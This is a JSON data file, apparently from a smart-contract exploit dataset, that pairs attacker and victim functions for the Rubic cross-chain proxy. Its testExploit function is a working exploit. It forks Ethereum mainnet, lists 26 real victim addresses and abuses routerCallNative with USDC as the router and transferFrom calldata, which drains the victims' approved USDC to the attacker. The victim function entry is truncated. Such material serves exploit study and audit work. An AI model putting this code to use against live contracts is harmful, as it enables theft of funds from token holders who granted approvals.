[
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "IS_TEST",
    "original_code": "",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeArtifacts",
    "original_code": "    function excludeArtifacts() public view returns (string[] memory excludedArtifacts_) {\n        excludedArtifacts_ = _excludedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeContracts",
    "original_code": "    function excludeContracts() public view returns (address[] memory excludedContracts_) {\n        excludedContracts_ = _excludedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "excludeSenders",
    "original_code": "    function excludeSenders() public view returns (address[] memory excludedSenders_) {\n        excludedSenders_ = _excludedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "failed",
    "original_code": "    function failed() public view returns (bool) {\n        if (_failed) {\n            return _failed;\n        } else {\n            return vm.load(address(vm), bytes32(\"failed\")) != bytes32(0);\n        }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "setUp",
    "original_code": "    function setUp() public {\n        cheats.createSelectFork(\"mainnet\", 16_260_580);\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifactSelectors",
    "original_code": "    function targetArtifactSelectors() public view returns (FuzzSelector[] memory targetedArtifactSelectors_) {\n        targetedArtifactSelectors_ = _targetedArtifactSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetArtifacts",
    "original_code": "    function targetArtifacts() public view returns (string[] memory targetedArtifacts_) {\n        targetedArtifacts_ = _targetedArtifacts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetContracts",
    "original_code": "    function targetContracts() public view returns (address[] memory targetedContracts_) {\n        targetedContracts_ = _targetedContracts;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetInterfaces",
    "original_code": "    function targetInterfaces() public view returns (FuzzInterface[] memory targetedInterfaces_) {\n        targetedInterfaces_ = _targetedInterfaces;\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSelectors",
    "original_code": "    function targetSelectors() public view returns (FuzzSelector[] memory targetedSelectors_) {\n        targetedSelectors_ = _targetedSelectors;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "targetSenders",
    "original_code": "    function targetSenders() public view returns (address[] memory targetedSenders_) {\n        targetedSenders_ = _targetedSenders;\n    }\n\n",
    "description": ""
  },
  {
    "contract/interface": "ContractTest",
    "source_type": "attacker_contract",
    "function_name": "testExploit",
    "original_code": "    function testExploit() external {\n        address[] memory victims = new address[](26);\n        victims[0] = 0x6b8D6E89590E41Fa7484691fA372c3552E93e91b;\n        victims[1] = 0x036B5805F9175297Ec2adE91678d6ea0a1e2272A;\n        victims[2] = 0xED9c18C5311DBB2b757B6913fB3FE6aa22b1A5b0;\n        victims[3] = 0xff266f62a0152F39FCf123B7086012cEb292516A;\n        victims[4] = 0x90d9b9CC1BFB77d96f9a44731159DdbcA824C63D;\n        victims[5] = 0x1dAeB36442d0B0B28e5c018078b672CF9ee9753B;\n        victims[6] = 0xF2E3628f7A85f03F0800712DF3c2EBc5BDb33981;\n        victims[7] = 0xf3f4470d71b94CD74435e2e0f0dE0DaD11eC7C5a;\n        victims[8] = 0x915E88322EDFa596d29BdF163b5197c53cDB1A68;\n        victims[9] = 0xD6aD4bcbb33215C4b63DeDa55de599d0d56BCdf5;\n        victims[10] = 0x2afeF7d7de9E1a991c385a78Fb6c950AA3487dbA;\n        victims[11] = 0x21FeBbFf2da0F3195b61eC0cA1B38Aa1f7105cDb;\n        victims[12] = 0xDbDDb2D6F3d387c0dDA16E197cd1E490543354e1;\n        victims[13] = 0x58709C660B2d908098FE95758C8a872a3CaA6635;\n        victims[14] = 0xD2C919D3bf4557419CbB519b1Bc272b510BC59D9;\n        victims[15] = 0xfE243903c13B53A57376D27CA91360C6E6b3FfAC;\n        victims[16] = 0xd5BD9464eB1A73Cca1970655708AE4F560Efc6D1;\n        victims[17] = 0xd6389E37f7c2dB6De56b92f430735D08d702111E;\n        victims[18] = 0x9f3119BEe3766b2CD25BF3808a8646A7F22ccDDC;\n        victims[19] = 0x8a4295b205DD78Bf3948D2D38a08BaAD4D28CB37;\n        victims[20] = 0xf4BA068f3F79aCBf148b43ae8F1db31F04E53861;\n        victims[21] = 0x48327499E4D71ED983DC7E024DdEd4EBB19BDb28;\n        victims[22] = 0x192FcF067D36a8BC9322b96Bb66866c52C43B43F;\n        victims[23] = 0x82Bdfc6aBe9d1dfA205f33869e1eADb729590805;\n        victims[24] = 0x44a59A1d38718c5cA8cB6E8AA7956859D947344B;\n        victims[25] = 0xD0245a08f5f5c54A24907249651bEE39F3fE7014;\n\n        RubicProxy1.BaseCrossChainParams memory _params1 = RubicProxy1.BaseCrossChainParams({\n            srcInputToken: address(0),\n            srcInputAmount: 0,\n            dstChainID: 0,\n            dstOutputToken: address(0),\n            dstMinOutputAmount: 0,\n            recipient: address(0),\n            integrator: integrators,\n            router: address(USDC)\n        });\n        RubicProxy2.BaseCrossChainParams memory _params2 = RubicProxy2.BaseCrossChainParams({\n            srcInputToken: address(0),\n            srcInputAmount: 0,\n            dstChainID: 0,\n            dstOutputToken: address(0),\n            dstMinOutputAmount: 0,\n            recipient: address(0),\n            integrator: integrators,\n            router: address(USDC)\n        });\n        uint256 amount;\n        for (uint256 i = 0; i < 8; i++) {\n            uint256 victimsBalance = USDC.balanceOf(victims[i]);\n            uint256 victimsAllowance = USDC.allowance(address(victims[i]), address(Rubic1));\n            amount = victimsBalance;\n            if (victimsBalance >= victimsAllowance) {\n                amount = victimsAllowance;\n            }\n            bytes memory data =\n                abi.encodeWithSignature(\"transferFrom(address,address,uint256)\", victims[i], address(this), amount);\n            Rubic1.routerCallNative(_params1, data);\n        }\n        for (uint256 i = 8; i < victims.length; i++) {\n            uint256 victimsBalance = USDC.balanceOf(victims[i]);\n            uint256 victimsAllowance = USDC.allowance(address(victims[i]), address(Rubic2));\n            amount = victimsBalance;\n            if (victimsBalance >= victimsAllowance) {\n                amount = victimsAllowance;\n            }\n            bytes memory data =\n                abi.encodeWithSignature(\"transferFrom(address,address,uint256)\", victims[i], address(this), amount);\n            Rubic2.routerCallNative(\"\", _params2, data);\n        }\n\n        emit log_named_decimal_uint(\n            \"[End] Attacker USDC balance after exploit\", USDC.balanceOf(address(this)), USDC.decimals()\n        );\n    }\n",
    "description": ""
  },
  {
    "contract/interface": "RubicProxy1",
    "source_type": "victim_contract",
    "function_name": "routerCallNative",
    "original_code": "    function routerCallNative(\n        string calldata _providerInfo,\n        BaseCrossChainParams calldata _params,\n        bytes calldata _data\n    ) external payable nonReentrant whenNotPaused eventEmitter(_params, _providerInfo) {\n        if (!availableRouters.contains(_params.router)) {\n            revert RouterNotAvailable();\n        }\n\n        IntegratorFeeInfo memory _info = integratorToFeeInfo[_params.integrator];\n\n        uint256 _amountIn = accrueTokenFees(\n            _params.integrator,\n            _info,\n            accrueFixedCryptoFee(_params.integrator, _info),\n            0,\n            address(0)\n        );\n\n",
    "description": ""
  }
]